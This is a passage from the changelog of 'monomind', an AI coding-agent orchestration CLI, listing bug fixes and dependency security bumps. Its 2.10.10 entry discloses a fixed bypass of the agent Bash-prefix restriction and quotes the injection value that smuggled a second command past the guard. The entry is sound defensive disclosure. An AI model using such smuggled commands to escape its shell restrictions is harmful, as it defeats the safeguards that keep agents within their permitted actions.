  pnpm-workspace-authoritative `pnpm-workspace.yaml` overrides) fixing
  GHSA-vwc7-r8mq-g2x9, a symlink-following zip-extraction vulnerability.
- `.gitignore` didn't cover several untracked `.monomind/` runtime paths
  (`orgs/*.json`, `episodic/`, `state/`, `backups/`, `dashboard-token`),
  so they showed up as untracked cruft in `git status` on every install.

## [2.10.28] — 2026-09-14

### Fixed

- `monomind init --force`, when re-run against a project whose
  `.claude/commands/` already contained a flat command file previously
  namespaced by the kimi-code/opencode generators (e.g.
  `monomind-truth-start.md`), stacked another `monomind-` prefix onto the
  kimi-code and opencode mirror filenames on every single run with no
  bound (`monomind-truth-start` → `monomind-monomind-truth-start` → ...).
  `kimiCommandFilename`/`opencodeCommandFilename` now recognize an
  already-namespaced name for the default `monomind` category and leave it
  as-is instead of re-joining. Real, non-default categories (e.g. a nested
  `github/github-modes.md` command) are unaffected.
- `monomind init --force`'s settings.json merge (`mergeHooksPreservingUnknown()`,
  from 2.10.25/26) kept every hook command but rebuilt each `hooks.<Event>`
  array starting from the template's own group order, so pre-existing blocks
  that also had a template counterpart (e.g. a `Grep|Glob` matcher and a
  `Write|Edit|MultiEdit|NotebookEdit` matcher in the opposite order from the
  template) traded positions on every run — a non-trivial diff even when
  nothing meaningfully changed. `mergeEventGroupsPreservingOrder()` now walks
  the existing array in its original order, refreshing matched blocks in
  place and only appending genuinely new template blocks at the end. Also
  fixed a missing trailing newline at all three `atomicWriteFile` call sites
  in `writeSettings()` (merged-write, corrupt-JSON-overwrite, and fresh-create
  — not just the `--force` path). A second `init --force` run now produces a
  byte-identical `.claude/settings.json`.
- 89 files under `.claude/agents/*.md` in this repo's own dogfooded tree
  carried a spurious `mode: subagent` frontmatter key, injected by the
  symlink write-back bug fixed in 2.10.27, some going back to at least
  2026-09-01. Stripped the single corrupted line from each (`mode` has no
  meaning in this repo's own agent format; `subagent` was the only value it
  ever took). Historical cleanup only — no code change, since 2.10.27 already
  stops the mechanism that caused it.

## [2.10.27] — 2026-09-14

### Fixed

- `monomind init --force` on a project with pre-existing `.opencode/{agent,command,skills}`
  or `.kimi-code/*` symlinks into `.claude/` (this repo's own dev checkout commits such
  symlinks) wrote the opencode/kimi converters' flattened, transformed output back through
  the symlink into the very `.claude/` tree it had just read — corrupting hand-authored
  agent files in place (a spurious `mode: subagent` key) and resurrecting flattened command
  duplicates (e.g. `.claude/commands/mastermind-adr.md`) on every run. `write-opencode.ts`
  and `write-kimicode.ts` (including kimicode's independent stale-file sweep) now call a new
  `isSafeConversionTarget()` guard that resolves the destination with `fs.realpathSync` and
  skips the write with a recorded error instead of writing through it when the destination
  resolves inside `.claude/`.
- `monomind init --force` silently dropped unrecognized `hooks`/permissions fields from an
  existing `.claude/settings.json` instead of merging into it — the merge-with-existing
  branch in `write-claude.ts` was gated on `!options.force`, so `--force` skipped it
  entirely. The merge branch now always runs when a settings file already exists, via a new
  `mergeHooksPreservingUnknown()`.
- `.kimi-code/plugin/commands/` and `.kimi-code/skills/` only ever accumulated entries on
  repeated `init --force` runs — renamed or removed source commands/skills were never swept.
  The existing generation manifest now tracks `kimiSkills`/`kimiPluginCommands` alongside the
  other generated-file sections so stale entries are removed like everywhere else.

## [2.10.20] — 2026-09-11

### Fixed

- `monomind init` double-wrote the body of every skill that appears in both
  the legacy skill copier and the newer evidence-gated platform-adapter
  installer (`mastermind`, `mastermind-plan`, `mastermind-execute`,
  `mastermind-debug`, `mastermind-org`, `mastermind-review`,
  `mastermind-research`, `mastermind-memory`) — the copier's raw, unwrapped
  write ran first, and the installer's managed-block merge then treated
  that as foreign content to preserve and appended a second, marker-wrapped
  copy of the same body after it. Every real `init` shipped these skills at
  roughly double their real length. Fixed at the merge step: content that
  already matches what's about to be installed is treated as if the file
  were new, not as text to preserve around the block.
- Agents run through the fence-protocol path (`antigravity-runner.ts`, and
  any other runner built on `tool-fence.ts`'s `executeToolCall`) had every
  tool call silently denied: `canUseTool`'s allowlist only ever contained
  the `mcp__org__`-prefixed name the native Claude SDK path registers,
  never the bare name a `\`\`\`tool_call` fence uses. Those turns fell back
  to the model's own native tools instead of the ones actually supplied,
  and the stdio bridge's `tool_call`/`tool_result` events (which drive
  desktop-app tool-call UI) never fired. `allowedToolNames` now includes
  both forms.
- `@monoes/monodesign`'s published package pointed its main entry at raw
  `.ts` source with no compiled `dist/` — `import '@monoes/monodesign'`
  crashed in any plain Node runtime ("Stripping types is currently
  unsupported for files under node_modules"). Not a live bug for this CLI,
  which only ever shells out to monodesign's CLI binary, but a real one for
  anyone depending on the package directly. Now ships a real `dist/` build
  with a `prepublishOnly` that rebuilds it fresh on every publish.

## [2.10.19] — 2026-09-11

### Fixed

- `monomind init`'s completion banner had a dropped clause ("...primary way
  to use the MCP server is registered..."); restored the missing "Monomind
  once" so the sentence reads correctly.
- `@monoes/monograph`'s README "Programmatic usage" example imported a
  `MonographEngine` class that has never existed — the package exports
  ~285 flat functions instead. Replaced with a real, runnable example
  (`buildAsync`, `openDb`, `queryGraph`, `getMonographImpact`).
- `@monoes/memory`'s README said `better-sqlite3` was an optional separate
  install ("faster than the sql.js WASM fallback"); it's been a mandatory
  dependency since 1.0.14, so that framing was stale and obscured why a
  fresh install can crash instead of silently falling back.
- Added a troubleshooting note (root README, `@monoes/hooks`,
  `@monoes/memory`) for the "Could not locate the bindings file" crash
  caused by npm's `allowScripts` policy blocking `better-sqlite3`'s native
  build — hit independently on monomind's own `doctor`, `@monoes/hooks`,
  and `@monoes/memory` during a full install/init field test across all
  10 published packages.

Also published this cycle as part of the same sweep: `@monoes/monograph`
1.6.3, `@monoes/hooks` 1.0.6, `@monoes/memory` 1.0.17 (all three are
README-only fixes, no code changes).

## [2.10.18] — 2026-09-11

### Fixed

- `session list` threw instead of rendering a blank/zero row if a session
  record ever had no `stats` object — a harder failure than the bug it
  replaced in 2.10.17 (which rendered blank cells rather than crashing).
  2.10.17 itself was verified clean against a real session file, but the
  read side had no defensive fallback for the case. Guarded with optional
  chaining and a `0` default.
- Bounded the `vitest`/`@vitest/mocker` override introduced in 2.10.17 to
  `>=4.1.11 <5` (it was unbounded, and 5.0.0 is already published) so a
  future dependency refresh can't silently jump a major version and break
  the test suite.

## [2.10.17] — 2026-09-11

### Fixed

- `task list`, `session list`, and `status tasks` rendered a blank ID column
  (and `session list` also showed blank Status/Agents/Tasks and "Invalid
  Date"): the CLI's type annotations for the `task_list`/`session_list` MCP
  tool results had drifted from what the handlers actually return
  (`task_list` returns `taskId`, not `id`; `session_list` returns
  `sessionId`/`savedAt`/`stats: {tasks, agents, ...}`, not
  `id`/`status`/`updatedAt`/`agentCount`/`taskCount` — sessions have no
  status concept at all). The interactive `session restore` picker had the
  same bug in a more severe shape: every option's `value` was `undefined`,
  so restoring by selection always tried to restore session `undefined`.
  Found via a fresh-install field test of 2.10.16, reproduced and fixed
  against the real handler shapes in `commands/task.ts`, `commands/status.ts`,
  and `commands/session.ts`.

### Security

- Bumped the `sharp` dependency override from `>=0.35.0` to `>=0.35.4` —
  `0.35.3` (the version that floor actually resolved to) carries an
  unpatched libheif vulnerability (GHSA-rgj7-g3m4-5g8c, high severity) that
  `npm audit`/`security scan` propagated all the way up through
  `@huggingface/transformers` → `@monoes/monomindcli` → `monomind` itself,
  flagging the `monomind` package as vulnerable in its own scan output.
  `0.35.4` is the current published release and fixes it; also found via
  the 2.10.16 field test, investigating a HIGH-severity self-flagged CVE
  that looked like a scan bug but was a real, unpatched transitive
  dependency.
- Same stale-override pattern as `sharp`, found while auditing the rest of
  the dependency tree: bumped `hono` from `>=4.12.34` to `>=4.13.5` (fixes
  three moderate advisories — an incomplete `toSSG()` path-traversal fix,
  unbounded `parseBody()` nesting, and a query-parser/URL-fragment
  cache-key differential) and `vitest`/`@vitest/mocker` to `>=4.1.11`
  (fixes a moderate path-traversal/arbitrary-file-read advisory in
  `@vitest/mocker`'s redirect-mock handling) — added as explicit overrides
  since several workspace packages' own `^4.1.4` ranges were each
  resolving independently and not converging on the patched version.
  `adm-zip` (flagged for a symlink-following extraction issue,
  GHSA-vwc7-r8mq-g2x9) has **no upstream fix yet** as of this release —
  `0.6.0`, the latest published version, is itself in the vulnerable range,
  so there is no version to bump to. Left as-is; the dependency is only
  reachable via `onnxruntime-node`'s install-time extraction, not any
  user-facing ZIP handling.

## [2.10.16] — 2026-09-10

### Fixed

- doctor: `checkMonographFreshness()` only scanned the last 4000 characters
  of `.monomind/graph/build.log` for an error signal. A real native-module
  load failure (the `bindings` package's own "Could not locate the bindings
  file. Tried:" message, printed when a `.node` binary was never built at
  all) writes its error text first, then a dozen-plus candidate file paths —
  easily 7-8KB total — so the last-4000-char tail landed entirely inside the
  path list and found no error keyword, and doctor reported the soft "No
  monograph graph built yet" for a build that had actually crashed. Found
  live-testing 2.10.15's `monomind init` in a bare directory (the `npx
  monomind@latest` shape the docs recommend), where the auto-installed
  `@monoes/monograph`'s `better-sqlite3` dependency didn't get its install
  script run. Widened the scan window to 64KB and added a distinct
  `classifyNativeModuleError()` pattern for this "binary never built" shape,
  separate from the existing NODE_MODULE_VERSION ABI-mismatch case, naming
  the actual missing module and pointing at `npm rebuild`/blocked install
  scripts (issue #231's underlying visibility work, follow-up to 2.10.15).

## [2.10.15] — 2026-09-09

Ships alongside `@monoes/monograph@1.6.2`.

### Fixed

- monograph: `@monoes/monograph@1.6.1` was published with a stale
  `dist/src/search/hybrid-query.js` missing the `searchGraph` export, even
  though the package's own `prebuild` clears `dist/` first — every consumer
  of `monograph_query`/`monograph_suggest` etc. hit `searchGraph is not a
  function` at runtime no matter how clean their own install was. A rebuild
  from the identical source produces the correct file, so the cause was a
  bad publish, not bad source. Republished as `1.6.2` from a clean rebuild,
  and added a `prepublishOnly` guard (`scripts/check-monograph-exports.mjs`)
  that scans the CLI's actual imports from the package and fails the publish
  if the built `dist/src/index.js` doesn't export all of them, as a backstop
  against however a stale build slips through again (issue #232).
- monograph: `monograph build` failing with a bare "Failed to open database"
  error hid the real cause (e.g. a `better-sqlite3` native binary built
  against the wrong Node ABI) in `.monomind/graph/build.log`, unread. All 7
  catch sites in `commands/monograph.ts` now surface the preserved `.cause`
  instead of dropping it, and a new `classifyNativeModuleError()` turns a
  recognized ABI-mismatch message into actionable guidance. `doctor`'s
  freshness check could not tell "still building" from "already crashed"
  from "never attempted" — it now reads `build.lock`/`build.log` (fixing a
  dead `.rebuild-lock` path nothing ever wrote to) to distinguish the three,
  and a real failure is reported as `fail` so fresh-install quieting can't
  soften it into an easy-to-miss info line. `init -y`'s automatic background
  build now also prints where to check on it (`monomind doctor` or the log
  directly) instead of implying unconditional success (issue #231).
- CLI: the graph-gate hook blocks the first grep/find attempt per session
  until `monograph_query` is called, then permanently degrades to a
  non-blocking reminder for the rest of the session — even reported this way,
  the block message read like a stuck session requiring a restart rather than
  a simple retry. `mcp verify`'s "claude mcp registration" check also treated
  `claude` missing from PATH the same as registration actually failing,
  failing the whole command even though per-project MCP registration needs
  neither. Both now say what's actually going on.

## [2.10.14] — 2026-09-08

Ships alongside `@monoes/monobrowse@1.0.8` and `@monoes/monodesign@1.2.5` —
the browser fixes below live in those packages, and `@monoes/monomindcli`
picks them up through its semver ranges.

### Fixed

- init/doctor: `init upgrade` restored `.claude/helpers/handlers/` and
  `utils/` recursively but could only ever (re)create the seven TOP-LEVEL
  helpers on the force-sync list. `audit-log-writer.cjs` is not one of them and
  `handlers/gates-handler.cjs` `require()`s it at module load, so upgrading a
  project that was missing it produced a gates handler that threw
  `MODULE_NOT_FOUND` on every PreToolUse hook — and `hook-handler.cjs` fails
  closed, blocking every Bash and Write/Edit call for the rest of the session,
  including the write that would have restored the file. Twelve other shipped
  helpers were in the same blind spot. The upgrade now also creates (never
  overwrites) any other top-level helper the bundle ships, so user-edited
  scaffolds like `memory.cjs` keep their edits. `doctor` reported a false
  "Project helpers match bundled version" for the same reason — its top-level
  list was the curated tracked set — and now checks every bundled top-level
  helper for existence (content is still only hash-compared for the tracked
  set, so local edits to scaffolds are not reported as staleness);
  `doctor --fix` restores what is missing. Defence in depth:
  `gates-handler.cjs` no longer lets an audit-logging import failure take the
  gates down with it — the decisions do not depend on the audit log, so it
  degrades to a no-op writer and keeps enforcing (issue #225).
- CLI: `memory store`'s own `--help` examples advertised `-k "key" -v "value"`,
  but `-v` is the global verbose flag, not a short form of `--value` — the
  value only survived by falling through to a positional argument. Examples now
  use `--value`, and the command warns when it takes a positional value while
  `-v` is set instead of leaving the user to guess (issue #226). The silent
  data loss also reported in #226 does not reproduce on 2.10.13: all four
  invocation shapes persist correctly when checked against the resolved store.
- monobrowse: `closeBrowser()` resolved on the `Browser.close` acknowledgement,
  which Chrome sends well before it exits — its only force-kill was an unref'd
  1s timer that never fired at all if the caller's process exited first. It now
  waits for the process to actually go away on the graceful path and force-kills
  what outlasts the bound, so a resolved `close()` means the browser is gone.
  This is the upstream cause of the monodesign port/profile-lock races patched
  downstream in 2.10.13's driver.
- monodesign: `scripts/run-tests.mjs` looked for node:test's TAP summary line
  (`# tests N`) only. Newer Node defaults to the spec reporter, which prints
  `ℹ tests N`, so every local `npm test` reported "the suite did not
  complete" and exited 1 with zero failures, while CI on Node 22 passed. It now
  accepts either, and still fails on a suite that ran nothing.
- monodesign: the driver-lifecycle test forced Chrome onto an OS-assigned
  ephemeral port, which the host is actively churning for outbound connections
  — a TOCTOU window between releasing it and Chrome binding it. It now picks
  from the same quiet 9520+ band the driver uses for its own choices.

- tests: `kg-eval-retrieval.test.ts` and `memory-bridge-fts-sync.test.ts` both
  document themselves as keyword-mode suites, but nothing ever set
  `MONOMIND_NO_LOCAL_EMBEDDINGS=1` — the claim only held on a machine where
  the embedding model happened not to be cached. CI provisions it (`doc eval
  --provision-model` is a build step), so `bridgeSearchEntries` took the
  semantic path and merged its hits over the keyword ones: the sole FTS5 match
  reported its real cosine (~0.821) instead of the keyword score of 1.0, a
  `routes` query also matched an unrelated entry above the 0.3 default
  threshold (2 hits, not 1), and the KG missing-answer fixture got 5
  nearest-neighbour triplets for a never-ingested query. Correct semantic
  behaviour, wrong path for these assertions to measure. Both files now set
  the flag for real and restore it afterwards (issue #228).
- monodesign: the monobrowse driver's `close()` waited for the CDP port to stop
  *accepting connections*, but Chrome closes its listener early in shutdown
  while the process is still alive holding both the port and the
  `--user-data-dir` singleton lock for it. On Windows that socket stays
  unbindable across the gap (node sets no `SO_REUSEADDR` there), so `close()`
  reported success and the next launch on the same forced port hung until its
  timeout — `Chrome failed to start on port N within 30000ms`, the
  intermittent `monodesign (windows)` CI failure. The release wait now probes
  whether the port can actually be **bound**, which is the question the next
  launch asks, and gets more runway on CI where teardown is slowest.
- monodesign: detection launches now get a throwaway `--user-data-dir` instead
  of monobrowse's default `tmpdir()/monomind-browser-<port>`. That default is
  right for `monomind browse`, where a later process reattaches by port, but
  it means two detection launches on the same port share one Chrome profile —
  and Chrome allows only one instance per profile, so the second hands its
  command line to the first and exits without opening a debugging port. On
  Windows the singleton lock outlives both the force-kill of the previous
  Chrome and the release of the port, which is what kept `monodesign
  (windows)` red after the port-probe fix above. Profile dirs are removed on
  close, with one deferred retry for the files Chrome recreates while exiting.

## [2.10.13] — 2026-09-08

### Fixed

- orgrt: `respawn-role.test.ts`'s git fixtures relied on the runner's ambient
  global `user.name`/`user.email` — always present on a dev machine, never
  set on a clean CI runner, so both tests failed "Author identity unknown"
  on every CI run. Fixtures now pass identity explicitly via `git -c`.
- memory: keyword-search results (FTS5 and BM25 paths) are ranked relative
  to the best match in each call's own small candidate set, so the top —
  or sole — result always normalised to ~1.0 regardless of true relevance;
  `threshold` compared against that already-inflated score could never
  reject it. A query matching nothing relevant could still surface a
  coincidental single-token overlap with full confidence. Results are now
  also gated on how much of the query they actually cover, independent of
  the rank-based score (issues #223/#224 follow-up).
- orgrt: `finishStop()`/`stopOrg()` closed each agent's mailbox and awaited
  `bus.flush()` but never cancelled work already in flight. A session mid-
  turn when the stop's drain bound elapsed kept running in the background;
  a late crash/completion after `stopOrg()` had already resolved could
  recreate a file inside a run directory a caller was already deleting
  (observed as `ENOTEMPTY` on the parent `rmdir` under CI's tighter
  timing). `finishStop()` now aborts each role's live incarnation via the
  same handle `org_respawn_role` already uses to force-stop a session, and
  the crash-retry backoff wait races that same signal instead of only
  noticing a stop once the full backoff duration elapses. `OrgBus` gains
  `seal()`, called right after `flush()`, so a late `emit()` still reaches
  in-memory listeners but can never schedule a new disk write into a run
  directory that's already being torn down.

## [2.10.12] — 2026-09-08

### Added

- orgrt: mid-run role replacement — `org_respawn_role` lets a boss/coordinator
  swap a role's adapter/model or spawn a replacement sub-agent live, on crash
  or budget exhaustion, instead of retrying the same config. Backed by new
  `RunningOrg.roleSlots` per-role lifecycle state, a bounded replacement
  budget allocator, drain/force-stop/state-preservation for the outgoing
  agent, checkpoint v2 (round-trips role-slot generation, respawn count,
  overrides, retired usage), and an audited receipt of each respawn.
  `org_list_runtime_options` reports available adapters/models for a role.
  Boss-only, config-gated.
- memory-kg: scoped entity identity, a claims ledger recording how each
  claim was obtained (and ranking on that), enforced graph integrity,
  indexed adjacency, and origin-support lookups.

### Fixed

- monograph: collision-resistant symbol IDs (File/Folder/Document node IDs
  keyed on exact path; namespace/arrow-fn/variable nodes minted via
  symbolId), consistent cache/DB recovery, PageRank caches correctly scoped
  to connection + graph revision, community clustering over the committed
  graph instead of raw parse output, one consistent higher-is-better score
  convention across query paths, rename paths resolved against the repo
  root, and `GRAPH_REPORT.md` no longer indexes itself into the graph it
  describes.
- orgrt: `TaskDag.merge()` now rejects cycles instead of silently
  deadlocking, and correctly allows merging into a `done` target (previously
  every terminal target was rejected, including completed work) while still
  rejecting `cancelled`/`failed`/`split`/`merged` targets. Fixed cross-org
  message drop and sender-identity spoofing under deferred spawn, an
  org-wide budget bug, a `startOrg` race, a pending-question watchdog gap,
  a concurrency-cap bug, approval-cache keys colliding across different
  call args for the same tool, tasks being marked `running` before their
  assignee was resolved/verified, and `org resume-from` now refuses to
  double-run against a live `serve` daemon (with a pidfile lock added to
  `org serve` itself).
- knowledge/doc search: the `doc search` and `knowledge_search` KG-triplet
  result fusion silently discarded the synthetic result id — a spread
  ordering bug (`{ id, kind, ...raw }` let `raw`'s own `id` win) meant the
  id returned for feedback/citation was `raw`'s bridge-entry id in a
  different namespace, not the intended `kg:<i>:source|relation|target`
  key. Fixed in both `doc.ts` and `knowledge-tools.ts`, with regression
  coverage for each.
- ui: dashboard org-stop now writes to the actual polled stopfile path
  (was writing to a location `org serve` never checked), and artifact
  reads are scoped to `.monomind`.
- **#222**: the orgs run-log watcher crashed with `Cannot read properties
  of undefined (reading 'close')` whenever the underlying `fs.watch()`
  failed synchronously (ENOSPC/EMFILE/a watched path disappearing) — its
  `chokidar.watch()` call passed `persistent: false`, routing into
  chokidar's one `setFsWatchListener()` branch that doesn't null-check a
  failed watch. Dropped `persistent: false` so it takes the already-guarded
  default branch instead. Regression test added.
- **#223**: `monograph search --format json` was returning the ASCII-table
  output instead of structured JSON.
- **#224**: `memory search` keyword-fallback scoring returned 0.00 instead
  of a real score when the vector path fell back to keyword matching.
- A stale test-only stub (`orgrt-server-auth.test.ts`) was missing the
  `orgs` field a since-merged per-org credential check now reads, crashing
  5/6 of its tests with an uncaught exception (mis-presenting as an
  180+ second "hang" rather than a fast failure).

## [2.10.11] — 2026-09-05

### Security

- 4 high + 2 moderate CVEs (`fast-uri` SSRF/host-confusion, `qs` array-limit
  bypass + DoS, `@xmldom/xmldom` XML fragment injection) were silently
  unpatched despite version floors in `package.json`'s `pnpm.overrides` —
  pnpm 10 stopped reading that field and had been ignoring it on every
  install. Migrated `overrides`/`onlyBuiltDependencies`/`peerDependencyRules`
  to `pnpm-workspace.yaml` (where pnpm 10+ actually reads them) and bumped
  the stale floors to patched versions. `pnpm audit --audit-level high`:
  9 vulnerabilities → 0 for this workspace's own installs. Also fixed
  `security:audit`/`security:fix`, which ran `npm audit` against a pnpm
  lockfile and failed with `ENOLOCK`.
- **Known residual risk, not fixable without a breaking migration**: the
  workspace-level fix above does not reach real downstream installs of the
  published `monomind`/`@monoes/monomindcli` packages — override/resolution
  fields only apply to the top-level installing project, never to a
  dependency's own declared overrides. A fresh `npm install monomind`
  still pulls a vulnerable `qs`/`body-parser` via `@monoes/mcp` and
  `@monoes/monograph`'s pinned Express 4 (its final 4.x release hard-pins
  `qs: ~6.15.1`; only Express 5 carries the fix, a breaking migration) and
  a vulnerable `sharp` via `@huggingface/transformers` (even its latest
  4.2.0 still depends on `sharp <0.35.0`; `npm audit` reports "No fix
  available" upstream). Verified via a real `pnpm pack` + `npm install`
  smoke test, not just the workspace's own `pnpm audit`.

### Fixed

- monograph: `DEFAULT_IGNORE` was missing common framework build/cache
  directories (`.next`, `.wrangler`, `.turbo`, `.nuxt`, `.svelte-kit`,
  `.vercel`, `.open-next`) — `monograph build` indexed generated bundles
  (which re-bundle `node_modules` code) alongside real source, inflating
  scanned file counts by >60% on affected projects and producing duplicate
  search results (#221).
- Dashboard (`monomind ui`): `ENOSPC` (system file-watcher limit reached)
  and any other `fs.watch`/`chokidar.watch` error crashed the whole process
  — none of the 6 watch call sites had an `'error'` listener, and Node's
  default behavior for an unhandled `EventEmitter` `'error'` event is to
  throw. Added a shared `watchSafely()` wrapper: logs a warning and
  disables that watcher instead of crashing (#220).
- `orgrt` server: the same root cause as above — `startOrgServer`'s
  `listen()` had no error handler, so a port-bind failure (e.g.
  `EADDRINUSE`) crashed the process instead of rejecting the startup
  promise. This was also the root cause of an intermittent crash in
  `tests/security/orgrt-server-cors.test.ts`, whose own port-selection
  helper had a separate close-then-rebind race; removed the race by
  passing port `0` directly to `startOrgServer` and reading the OS-assigned
  port back off the server.
- Cleared 5 biome formatting errors caught by the public-readiness audit
  (line-wrap style; no logic changes).

## [2.10.10] — 2026-09-04

### Security

- **Command-injection bypass in scoped Bash access for agent-exec sessions**
  — `hasUnsafeShellSyntax` (the guard behind `--allow-bash-prefix`, which
  scopes an agent's Bash access to an exact command prefix) didn't track
  backslash-escaping. A backslash-escaped quote outside real quotes was
  mistaken for a genuine quote-toggle, hiding a trailing `;`/`&`/`|`/
  backtick/`$(` from detection even though bash itself still executes it —
  verified live (`foo \'; touch /tmp/PWNED` slipped through). Fixed by
  tracking backslash-escaping per real bash quoting rules; added
  regression tests for the exact bypass plus two false-positive checks.

### Added

- `--allow-bash-prefix` on `monomind agent-exec` — scopes an agent-exec
  session's Bash tool to commands matching one or more exact prefixes,
  denying anything else (including a matching prefix followed by shell
  metacharacters).

### Fixed

- CI: `Tests` workflow's default Node bumped from 20 to 22 — `nanoid@6`
  (pulled in workspace-wide via vite/vitest) requires Node `^22 || ^24 ||
  >=26`, which had been silently failing every job's install step since
  at least 2026-09-02.
- The root `.claude/` tree and the npm-shipped
  `packages/@monomind/cli/.claude/` copy had diverged in two files
  (one each direction) — re-synced and verified byte-identical.
- 13 shipped Mastermind skill template files (`.claude/skills/mastermind-*`)
  had corrupted, self-duplicated content (a stray nested
  `monomind:start`/`monomind:end` wrapper around already-wrapped output),
  making the `claude` platform's install non-idempotent. Stripped the
  duplication in both the root and npm-shipped trees.
- `org-gate-hard-block.test.ts`: a test-cleanup race (`rmSync` running
  before `OrgBus`'s fire-and-forget disk writes had flushed) could fail
  with `ENOTEMPTY` under parallel test load.
- `init-e2e.test.ts`: updated a stale assertion that predated native Codex
  hooks becoming on-by-default (2026-09-02).

## [2.10.9] — 2026-09-02

### Changed

- **Graph-first navigation is now enforced on Kimi and OpenCode too** — the
  graph gate (first grep/search in a session blocked once until a monograph
  tool is called, then warn-only) previously ran only on Claude Code. Kimi's
  plugin now matches `Grep|Glob`, and OpenCode's plugin routes `grep`/`glob`
  through the same `pre-search` gate with a real session ID (previously
  empty, which silently disabled the gate there).
- **Persistent opt-out** for the graph gate:
  `.monomind/guidance/active-gates.json` → `{"graphGate": "off"}`,
  alongside the existing `MONOMIND_GRAPH_GATE=off` env var.
- CI: publish smoke test now runs on Node 20 and 26.

## [2.10.8] — 2026-09-02

### Fixed

- **Symbol names for Kotlin, Ruby, C++, and Dart** — these grammars declare
  no (or only partial) field names, so names fell back to raw node text
  (`class Foo {`, `int count()`, `compute(int x)`). Per-language name
  refiners now extract clean identifiers. Surfaced by the WASM migration:
  most of these grammars had never worked under the native binding, so the
  defect was previously invisible.
- **Spurious keyword symbols in Ruby** — the extractor no longer treats
  anonymous keyword tokens as symbols (tree-sitter-ruby types the `class`
  keyword token as a node of type `class`).
- CLI: `{org}-runstate.json` files are excluded from org config listing, so
  they no longer appear as phantom orgs.

## [2.10.7] — 2026-09-01

### Changed

- **Monograph now runs tree-sitter grammars as WebAssembly** instead of the
  native Node binding. Grammars are vendored as `.wasm` files
  (`@monoes/monograph` 1.6.0), so installs no longer need node-gyp, native
  prebuilds, or the 15 grammar packages as runtime dependencies — eliminating
  the entire class of ABI-mismatch and native-build failures (the dependency
  angle of #219). Parses are also faster: 14.1s vs 23.8s indexing this
  repository, with six previously silent grammar failures (C, C++, Dart,
  Kotlin, Ruby, Swift) now parsing correctly. Refs #219.

### Notes

- `.vue` files are now always parsed via `<script>`-block extraction with the
  TypeScript grammar; tree-sitter-vue is dropped (its external scanner cannot
  build to WASM without emscripten, and the extraction config was already
  TypeScript-typed).
- Grammar WASM files are refreshed with
  `node scripts/refresh-wasm.mjs` in `@monoes/monograph`.

## [2.10.6] — 2026-09-01

### Fixed

- Monograph: `.tsx` and `.jsx` files were parsed with tree-sitter's plain
  TypeScript grammar, producing recovered parse errors on any JSX syntax.
  They are now routed to the dedicated TSX grammar (language identity in the
  graph stays `typescript`). Refs #219.
- Monodesign: local Chrome teardown could report "closed" before releasing
  its forced debug port, so the next launch attached to a process still
  exiting and the CDP session failed. Teardown now waits (up to 5s) for the
  port listener to disappear.
- CLI: removed a stale dashboard test assertion for the retired budgets tab.

## [2.10.5] — 2026-08-29

### Fixed

- `orgrt`: `ClaudeAgentRunner` no longer wipes the child process environment
  or auto-loads interactive settings when spawning agents.

## [2.10.4] — 2026-08-28

### Changed

- Spreadsheet extraction is now opt-in. `monomind init` no longer downloads
  SheetJS; it explains how to install `xlsx` when `.xlsx`, `.xls`, or `.ods`
  support is needed.

## [2.10.3] — 2026-08-28

### Changed

- Maintenance release. No public API changes.

## [2.10.2] — 2026-08-27

### Fixed

- `doctor`'s Monograph and Vector Memory checks reported "Package not found" /
  "not installed" even when `@monoes/monograph` and `@monoes/memory` were
  correctly installed — the checks guessed relative `node_modules` paths that
  never matched how npm actually hoists dependencies (flat local installs,
  npx's isolated cache dir, and global installs all place `@monoes/*`
  packages as siblings, not nested under this package's `dist/` output).
  Both checks now resolve through Node's real ESM module resolution
  (`import.meta.resolve`) instead.
- Codex native hooks: `[[hooks.SessionStart]]` and `[[hooks.SessionEnd]]`
  entries were missing from the generated `.codex/config.toml` — only
  `PreToolUse`/`PostToolUse` were wired, so Codex projects never got session
  restore/persistence via the Monomind hook bridge. All four hook events are
  now generated when `--enable-hooks` is passed to `init --codex`.

## [2.10.1] — 2026-08-26

### Fixed

- `pi`/`pi-rpc` runners: removed a nonexistent `--approve` flag that made
  every turn fail immediately with "Unknown option: --approve" — confirmed
  live against pi 0.73.1's own `--help`, which lists no approve/trust/yolo
  option at all. `--mode json`/`--mode rpc` alone were verified not to block
  on an interactive trust prompt, so no replacement flag was needed.
- `kimicode` runner: the agent-file body (everything after the `---`
  frontmatter) could be empty — and kimi rejects that with "Missing prompt
  body" — for any bare `agent exec` call with no `--system-file` and no
  tools (e.g. `agent.ask`, `chat` without `--canvas`, `agent test`). Falls
  back to a minimal default system prompt when none is given.

## [2.10.0] — 2026-08-25

### Added

- **Agent Exec Protocol v1** (`doc/agent-exec-protocol.md`): a public,
  versioned subprocess contract exposing monomind's `AgentRunner` engine and
  org observe surface to external callers. First caller: mono-agent's
  `monoagentcli`.
  - `monomind agent exec --runtime <id> --prompt <text>`: one-shot agent
    turns over NDJSON stdout (`start`/`session`/`assistant`/`tool_call`/
    `tool_result`/`usage`/`result`/`error`/`done`), with `--tools-file`
    JSON-Schema tool definitions bridged to caller-side handlers over stdio
    — native tool wiring on SDK-backed runners (claude), fence-protocol
    fallback on the rest. Optional `--budget-usd` spend cap and `--timeout`
    wall-clock cap, both enforced with the same SIGTERM→kill escalation as
    orgrt.
  - `monomind agent scan --json [--installed]`: parallel runner detection
    across all known agent CLIs, honoring `<NAME>_CLI_BIN` overrides.
  - `monomind --version --json`: capability handshake
    (`agent-exec`/`agent-scan`/`org-json-v1`) so callers fail fast with an
    actionable upgrade hint against an incompatible monomind instead of a
    confusing parse error.
  - `--format json` added to existing org observe commands (`status`,
    `logs`, `report`, `costs`, `list`, `questions`, `gates`, `decisions`,
    `memory`) plus action results (`answer`/`approve`/`deny`/
    `gate-approve`/`gate-reject`); new `org events [--follow] [--since]`
    live-tails `bus.jsonl` as NDJSON.
  - Golden NDJSON transcript fixtures (`doc/agent-exec-protocol/fixtures/`)
    for caller-side contract tests without running monomind.

## [2.9.27] — 2026-08-24

### Added

- Evidence-gated platform adapters for all supported coding runtimes, with
  scoped plan/install/upgrade/uninstall operations, a read-only doctor, MCP
  diagnostics, portable Mastermind workflow routing, and generated
  compatibility documentation.

### Changed

- Deprecated platforms setup; it no longer installs SessionStart prompt
  injection or global plugin artifacts.

## [2.9.25] — 2026-08-23

### Fixed

- `monomind init --target codex --force` now repairs incomplete native-hook
  markers in existing `.codex/config.toml` files and preserves generated hook
  configuration while merging the status line.
- Final Biome diagnostics are resolved, including vector dimension validation
  in the memory quantizer.

## [2.9.24] — 2026-08-23

### Security

- Replaced the abandoned `ollama-ai-provider` (v1) dependency with the
  actively maintained `ollama-ai-provider-v2`, removing a vulnerable
